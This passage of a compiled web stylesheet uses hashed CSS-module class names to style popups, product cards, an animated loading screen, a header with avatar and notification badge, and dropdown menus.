        color: var(--ah-grey-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT {
        z-index: 999999;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        width: 400px;
        min-height: 80px;
        border-radius: 8px;
        position: absolute;
        top: -18px;
        left: -52px;
        background-color: var(--ah-white);
        box-shadow: var(--ah-grey-200) 5px 4px 14px -5px
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._2-hexajWsLxN1QLvxeQ8DR {
        height: 52px;
        width: 100%;
        border-radius: 8px 8px 0 0;
        padding-left: 24px;
        display: flex;
        align-items: center;
        justify-self: flex-start;
        background-color: var(--ah-green-100);
        border-color: var(--ah-green-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._2-hexajWsLxN1QLvxeQ8DR div {
        color: var(--ah-white);
        font-weight: 700;
        height: 16px;
        margin-right: 8px
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._2-hexajWsLxN1QLvxeQ8DR div svg path {
        fill: var(--ah-white)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._2-hexajWsLxN1QLvxeQ8DR._3fdVPFjMA29XOSQnqOIbPn {
        background-color: var(--ah-yellow-100);
        border-color: var(--ah-yellow-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._2-hexajWsLxN1QLvxeQ8DR.RiD9RVAX2dK8GjYy4AWHm {
        border-color: var(--ah-red-100);
        background-color: var(--ah-red-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 {
        width: 100%;
        padding: 24px
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._3XCznte9txUBqppIuY9rUN {
        margin-top: 12px;
        display: flex;
        flex-direction: column
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._1nl8LpZaSh3Euug0ll24fY {
        display: grid;
        gap: 8px;
        grid-template-columns: auto 1fr;
        margin-top: 12px
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._1nl8LpZaSh3Euug0ll24fY [class^='green'] {
        color: var(--ah-green-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._1nl8LpZaSh3Euug0ll24fY [class^='red'] {
        color: var(--ah-red-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._1nl8LpZaSh3Euug0ll24fY [class^='yellow'] {
        color: var(--ah-yellow-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._1nl8LpZaSh3Euug0ll24fY span {
        display: inline-block;
        font-weight: 700
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._1nl8LpZaSh3Euug0ll24fY ._2o0XDFw4FjS6nlmI82kP_J {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        margin-top: 5px;
        background-color: var(--ah-green-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._1nl8LpZaSh3Euug0ll24fY ._1JnT-zd2CRkN_pyZpLxYOX {
        background-color: var(--ah-red-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT ._3MTGtG8gmaSVnQzZiFl7z9 ._1nl8LpZaSh3Euug0ll24fY .XCGzimCQBwiSW5PgzZ_nJ {
        background-color: var(--ah-yellow-100)
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X .gT8VPdOZndHvu0S6IgxBT .mOYR956RdymxYRO__UZE7 {
        display: flex;
        width: 100%;
        min-height: 40px;
        align-items: center;
        justify-content: flex-start;
        padding: 12px 24px 24px 24px
    }

    ._3zKBB95SM7C03B7htFGsnF._3NrHYKhhiY3mcEOuSzCc0X ._1QSm57Oa2LqLAUI_n6rBK5 {
        width: 90%;
        height: 1px;
        background-color: var(--ah-grey-700)
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI {
        box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.08)
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI .uoTRazTqIhVIB4uqNnlR7 {
        display: block;
        width: 100%;
        height: 128px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: cover;
        border-radius: 4px 4px 0 0;
        border: 1px solid #f5f5f5;
        cursor: pointer
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._2UXHt24823xwuIcZygOje_ {
        background: #fff;
        padding: 10px 6px;
        border-radius: 0 0 4px 4px
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._142_Uj1jzfnrbXmSQF5D9k {
        display: flex;
        align-items: center;
        cursor: pointer
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._142_Uj1jzfnrbXmSQF5D9k * {
        cursor: pointer
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._142_Uj1jzfnrbXmSQF5D9k .yyqlX6hpq3n8T6gMarqO- {
        font-weight: 700;
        color: var(--ah-yellow-300);
        margin-right: 3px;
        font-size: 12px
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._142_Uj1jzfnrbXmSQF5D9k ._1o9PXz43L0i7OhhjwBjn4A {
        display: flex;
        align-items: center
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._142_Uj1jzfnrbXmSQF5D9k ._1o9PXz43L0i7OhhjwBjn4A .yyqlX6hpq3n8T6gMarqO- {
        display: inline-flex;
        font-weight: 700;
        color: var(--ah-yellow-300);
        margin-right: 6px;
        font-size: 12px;
        border: 1px solid #f0a92e;
        padding: 0px 6px;
        border-radius: 3px;
        background-color: #f0a92e38;
        color: #b07c21;
        height: 34px;
        align-items: center
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._142_Uj1jzfnrbXmSQF5D9k ._1o9PXz43L0i7OhhjwBjn4A ._3sZwOQluV2NZErn1PYLZ-z {
        color: var(--ah-black-200);
        font-size: 12px;
        max-width: 128px;
        overflow: hidden;
        width: 100%;
        text-overflow: ellipsis;
        white-space: nowrap
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._142_Uj1jzfnrbXmSQF5D9k ._1o9PXz43L0i7OhhjwBjn4A ._3sZwOQluV2NZErn1PYLZ-z:hover {
        cursor: pointer;
        color: var(--ah-red-100)
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._142_Uj1jzfnrbXmSQF5D9k ._1o9PXz43L0i7OhhjwBjn4A:hover {
        color: var(--ah-red-100)
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI .MvBqOKQuCFwMgN1Ghqm1i {
        margin-bottom: 4px
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI .MvBqOKQuCFwMgN1Ghqm1i .s5LXEp-QPxwaIDlKjGJ-v {
        display: flex;
        color: var(--ah-black-200);
        justify-content: space-between
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI .MvBqOKQuCFwMgN1Ghqm1i .s5LXEp-QPxwaIDlKjGJ-v ._24iRdDvmZN11G84dO89qXy {
        width: 20px;
        color: var(--ah-yellow-100)
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI .MvBqOKQuCFwMgN1Ghqm1i .s5LXEp-QPxwaIDlKjGJ-v svg {
        margin-right: 4px
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._1JK8c3LUPAxKfwNQwrGyLN {
        display: flex;
        font-size: 12px;
        display: flex;
        align-items: baseline;
        justify-content: space-between
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._1JK8c3LUPAxKfwNQwrGyLN ._2R80u0wUVsHV3pq79fJuDa {
        display: inline-flex;
        width: 12px
    }

    ._2z8ONN9-h-extYKefpHKb-._2oxt5p_LmRIGHXDStzVITI ._1JK8c3LUPAxKfwNQwrGyLN svg {
        margin-right: 4px
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3XvLtimxxyOpWdQPZ6E6Em {
        display: flex;
        position: relative;
        min-height: 500px;
        justify-content: center;
        align-items: center
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3XvLtimxxyOpWdQPZ6E6Em ._2slX2UHCo2Vu0XhtyCiWWo {
        position: absolute;
        right: 100px;
        top: 0;
        animation-name: _1zTSuoy1Clhe5sDE5oSNEB;
        animation-duration: 7000ms;
        animation-iteration-count: infinite;
        animation-timing-function: linear
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3XvLtimxxyOpWdQPZ6E6Em .u0mOpUl_g0o4DNVDIcyhZ {
        position: absolute;
        top: -20px;
        right: 330px;
        animation-name: _2x_3H8_1V3iNSfmgwmJJG6;
        animation-duration: 5000ms;
        animation-iteration-count: infinite;
        animation-timing-function: linear
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3XvLtimxxyOpWdQPZ6E6Em ._2b566aKEZUevSdwTCzI1NM {
        position: absolute;
        top: 60%;
        right: 90%;
        z-index: 8888;
        animation: _1Wv-vw4jIS-WkUzlgDKeJX 4s linear infinite
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3XvLtimxxyOpWdQPZ6E6Em ._3PGafU4qc7ApkR9wWjbgHO {
        z-index: 9999
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._2Q16GJgPeOeBmSR0sKAP15 {
        position: absolute;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        gap: 5px;
        z-index: 99999;
        top: 48%;
        overflow: hidden
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3zIFRllvABLh5mNahLOnp6 {
        width: 300px;
        border-radius: 30px;
        background: rgba(0, 0, 0, 0.25)
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._1wYlXx1NhPEAFbBZy7MdyJ {
        height: 11px;
        border-radius: 30px;
        background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.05));
        transition: 0.4s linear;
        transition-property: width, background-color
    }

    ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3BiFo2Itnn49-nt8iZT9jO ._1wYlXx1NhPEAFbBZy7MdyJ {
        width: 85%;
        background-color: #f0a92e;
        animation: UWwCN5YArN0Uyxr5qJRND 20s
    }

    @media (max-width: 1024px) {
        ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3XvLtimxxyOpWdQPZ6E6Em ._2slX2UHCo2Vu0XhtyCiWWo {
            right: 94px
        }
    }

    @media (max-width: 900px) {
        ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3XvLtimxxyOpWdQPZ6E6Em ._2slX2UHCo2Vu0XhtyCiWWo {
            right: 36px
        }

        ._3aj7VhdU6IGktYr1InhVm0._21n3QG8V70vzJfKiNt0U2y ._3XvLtimxxyOpWdQPZ6E6Em .u0mOpUl_g0o4DNVDIcyhZ {
            right: 255px
        }
    }

    @keyframes UWwCN5YArN0Uyxr5qJRND {
        0% {
            width: 5%;
            background-color: #f3bd5e
        }

        100% {
            width: 85%;
            background-color: #f0a92e
        }
    }

    @keyframes _1zTSuoy1Clhe5sDE5oSNEB {
        from {
            transform: rotate(0deg)
        }

        to {
            transform: rotate(360deg)
        }
    }

    @keyframes _2x_3H8_1V3iNSfmgwmJJG6 {
        from {
            transform: rotate(360deg)
        }

        to {
            transform: rotate(0deg)
        }
    }

    @keyframes _1Wv-vw4jIS-WkUzlgDKeJX {
        0% {
            transform: rotate(10deg);
            right: 85%
        }

        5% {
            transform: rotate(10deg);
            top: 50%;
            right: 75%
        }

        10% {
            transform: rotate(10deg);
            top: 50%;
            right: 68%
        }

        20% {
            transform: rotate(45deg);
            top: 50%;
            right: 55%;
            height: 30px
        }

        35% {
            transform: rotate(10deg);
            right: 45%
        }

        65% {
            transform: rotate(10deg);
            right: 32%
        }

        80% {
            transform: rotate(10deg) scale(0.8);
            right: 23%
        }

        100% {
            transform: rotate(40deg) scale(0);
            top: 10px;
            right: 0%
        }
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw {
        display: flex;
        flex-direction: column;
        justify-content: space-evenly;
        height: 100%
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R {
        display: flex;
        flex-direction: column;
        margin: 8px 0
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R div {
        font-size: 13px
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R div b {
        display: inline-block;
        font-weight: 600
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R ._1ozj9Qgqao7lRxom8wU3S1 {
        display: inline-flex;
        justify-content: flex-start
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R ._1ozj9Qgqao7lRxom8wU3S1 ._1A79H6eqM6JmZJoTCJsBOv {
        padding-top: 3px
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R ._1ozj9Qgqao7lRxom8wU3S1 span {
        display: inline-block
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R ._1A79H6eqM6JmZJoTCJsBOv {
        display: inline-flex;
        width: 24px;
        font-size: 20px;
        margin-right: 8px
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R ._1A79H6eqM6JmZJoTCJsBOv svg path {
        fill: #2e2e2e
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R ._2GWvqfPAnt12ICXWx69egp {
        display: inline-block;
        margin-left: 10px;
        padding: 3px 6px;
        border-radius: 4px;
        background: var(--ah-warning);
        color: #fff;
        font-weight: 400;
        text-transform: initial
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R ._1u990SFDyV2EF8haDLF9gW {
        display: inline-block;
        margin-left: 12px;
        width: 16px;
        height: 16px
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3WTCeyyw52AasDCYke99yw ._21tLxLoZNjSMyfKT9B7J3R ._1u990SFDyV2EF8haDLF9gW svg path {
        fill: var(--ah-success)
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._21ohnjjHI8ezngn2cQzKaC {
        font-weight: bold;
        font-size: 12px;
        line-height: 20px;
        color: var(--ah-grey-100)
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._1FP8Jvrh0sur6Tn0oNvI8V {
        display: flex;
        align-items: center;
        justify-content: space-between;
        width: 100%
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W .lxG-j-zHjHWV6Tip-csB4 {
        height: 30px;
        display: flex;
        align-items: center
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._1xPuQOKmEltly5-OLumt-i {
        align-items: center;
        display: flex
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._1xPuQOKmEltly5-OLumt-i ._1ZYpKNOMT9oi5Nu5SEWzD7 {
        z-index: 99999;
        display: flex;
        align-items: center;
        gap: 8px;
        padding: 8px 0 8px 0;
        cursor: pointer
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._1xPuQOKmEltly5-OLumt-i ._1ZYpKNOMT9oi5Nu5SEWzD7 svg {
        width: 16px !important
    }

    ._2thAHUo8ga4kPKyekisDe._2Fndhr7_hLwCrxgGidr56W ._3eQNFZgkF3l0ek45NZDn-o {
        text-align: center;
        padding: 8px;
        font-size: 10px;
        line-height: 20px;
        color: var(--ah-grey-300)
    }

    ._3yeR1TIEftCr8zoup8RjZv {
        position: relative !important
    }

    ._3yeR1TIEftCr8zoup8RjZv._2Ewd35Q5hZk_87LKIMSVhh .ruz2TITodwSNXWdJBBpav {
        top: 100%;
        opacity: 1;
        display: block
    }

    ._3yeR1TIEftCr8zoup8RjZv.HxBRKeLDpSCwoW0PKT3z .gBt3RREvq-oLUW8T3TxXw {
        top: 100%;
        opacity: 1;
        display: block
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM {
        background-color: var(--ah-white);
        padding-top: 8px;
        padding-bottom: 2px;
        border-bottom: none;
        border-radius: 10px 10px 0 0;
        background-color: #fff;
        padding-right: 1px;
        display: flex
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 {
        display: inline-flex;
        align-items: center;
        cursor: pointer
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY {
        font-size: 12px;
        display: inline-flex;
        cursor: pointer;
        background: #262626;
        align-items: center;
        border-radius: 20px
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY * {
        cursor: pointer
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY a {
        display: inline-block;
        color: #008fff;
        cursor: pointer
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY a:hover {
        text-decoration: underline
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY._3urHVCoGYFmmSq28I2aIX- ._36gN6Ct5BzgwGUXQQp29n5 {
        width: auto;
        opacity: 1;
        padding: 0 10px
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY._3urHVCoGYFmmSq28I2aIX- ._36gN6Ct5BzgwGUXQQp29n5 * {
        opacity: 1
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY ._36gN6Ct5BzgwGUXQQp29n5 {
        transition: all 0.15s ease-in-out;
        display: inline-flex;
        width: 0;
        height: 32px;
        opacity: 0;
        align-items: center
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY ._36gN6Ct5BzgwGUXQQp29n5 span {
        display: inline-block;
        color: #fff;
        padding: 0 6px
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY ._36gN6Ct5BzgwGUXQQp29n5 * {
        opacity: 0
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY ._2Oe7hl5b2jOcvncYQJ-wj1 {
        display: inline-flex;
        width: 32px;
        height: 32px;
        justify-content: center;
        align-items: center;
        position: relative;
        z-index: 999
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY ._2Oe7hl5b2jOcvncYQJ-wj1 ._1qb9HEWuEnymwG5KaK8ozH {
        display: inline-flex;
        justify-content: center;
        align-items: center;
        position: absolute;
        top: -4px;
        right: -4px;
        background: #d63436;
        width: 16px;
        height: 16px;
        border-radius: 50%
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._1UgjSIwoRTebdcTsVpAtcY ._2Oe7hl5b2jOcvncYQJ-wj1 ._1qb9HEWuEnymwG5KaK8ozH span {
        font-size: 9px;
        color: #fff
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM .bt-yvC12jsNpW8luh3tW2 ._27zQc2AtIxvuTFPej398pa {
        font-size: 12px;
        font-weight: 700;
        display: inline-flex;
        cursor: pointer
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM ._1BfKc2revb2fiet_PYRSMe {
        display: inline-flex;
        margin-left: 20px
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM ._1BfKc2revb2fiet_PYRSMe span {
        display: inline-flex;
        width: 32px;
        height: 32px;
        border-radius: 50%;
        overflow: hidden;
        cursor: pointer
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM ._1BfKc2revb2fiet_PYRSMe span img {
        cursor: pointer
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM ._1BfKc2revb2fiet_PYRSMe .Xhaqp2DgJXtiVhp-t1voa {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
        background: #64026d;
        overflow: hidden
    }

    ._3yeR1TIEftCr8zoup8RjZv ._2-4vkltWXVEL1sI2KzV7EM ._1BfKc2revb2fiet_PYRSMe .Xhaqp2DgJXtiVhp-t1voa span {
        color: #fff;
        width: auto;
        height: auto;
        font-size: 16px;
        font-weight: 500
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav {
        position: absolute;
        top: calc(100% + 30px);
        right: 68px;
        transition: all 0.35s ease-in-out;
        opacity: 0;
        display: none;
        background: #fff;
        box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.08);
        padding: 18px;
        z-index: 99999999;
        width: 210px;
        border-radius: 4px
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 {
        display: grid;
        grid-template-columns: 1fr
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._35VMirwvFW8jB4dwmdbSuF {
        display: flex
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._35VMirwvFW8jB4dwmdbSuF+._35VMirwvFW8jB4dwmdbSuF {
        margin-top: 22px
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._35VMirwvFW8jB4dwmdbSuF div {
        font-size: 13px
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._35VMirwvFW8jB4dwmdbSuF div b {
        display: inline-block;
        font-weight: 600
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._35VMirwvFW8jB4dwmdbSuF ._1kN9bQ4SUYYE8m_Q0JtFQQ {
        display: inline-flex;
        justify-content: flex-start;
        align-items: center
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._35VMirwvFW8jB4dwmdbSuF .eQuAkiaMGyu4Wuq4wZFZx {
        display: inline-block;
        width: 20px;
        font-size: 20px;
        margin-right: 10px
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._35VMirwvFW8jB4dwmdbSuF .eQuAkiaMGyu4Wuq4wZFZx svg,
    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._35VMirwvFW8jB4dwmdbSuF .eQuAkiaMGyu4Wuq4wZFZx path {
        fill: #2e2e2e
    }

    ._3yeR1TIEftCr8zoup8RjZv .ruz2TITodwSNXWdJBBpav ._3otqmgba-DFZlAefv2JXF7 ._1gdjSUIvV5cef_n-EuiPJz {
        display: flex;
        margin-top: 14px
    }

    ._3yeR1TIEftCr8zoup8RjZv .gBt3RREvq-oLUW8T3TxXw {
        position: absolute;
        top: calc(100% + 30px);
        right: 0;
        transition: all 0.35s ease-in-out;
        opacity: 0;
        display: none;
        background: #fff;
        box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.08);
        padding: 0 20px 20px;
        z-index: 99999999;
        width: 210px;
        border-radius: 4px
    }

    .tPc2NitupTU7CE5OO3fhJ._1o4fNgNKIHIB239z7YCsWS {
        min-height: 180px
    }

    .tPc2NitupTU7CE5OO3fhJ ._2zO7PPTI1gJmAjpfa4Ik7s {
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 70px 0
    }

    .tPc2NitupTU7CE5OO3fhJ ._367kQ8LcLUwxek51FlSuTI {
        padding: 24px 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    .tPc2NitupTU7CE5OO3fhJ ._367kQ8LcLUwxek51FlSuTI ._1Gx2VuVZ6nRQypQ3OAlsau {
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        color: #006fe3;
        font-weight: 600;
        cursor: pointer
    }

    .tPc2NitupTU7CE5OO3fhJ ._367kQ8LcLUwxek51FlSuTI ._1Gx2VuVZ6nRQypQ3OAlsau * {
        cursor: pointer
    }

    ._2pkcNexDjI-G9sUpTum05p._1eHwmdxlB9f9ngEWp53L96 {
        min-height: 180px
    }

    ._2pkcNexDjI-G9sUpTum05p ._4uONgNsn24fqidesovk_K {
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 70px 0
    }

    ._2pkcNexDjI-G9sUpTum05p ._27hz64KLfMqP9peu77mVDV {
        padding: 24px 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2pkcNexDjI-G9sUpTum05p ._27hz64KLfMqP9peu77mVDV ._3dRZetUjYHzv-Inw5k3L6n {
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        color: #006fe3;
        font-weight: 600;
        cursor: pointer
    }

    ._2pkcNexDjI-G9sUpTum05p ._27hz64KLfMqP9peu77mVDV ._3dRZetUjYHzv-Inw5k3L6n * {
        cursor: pointer
    }

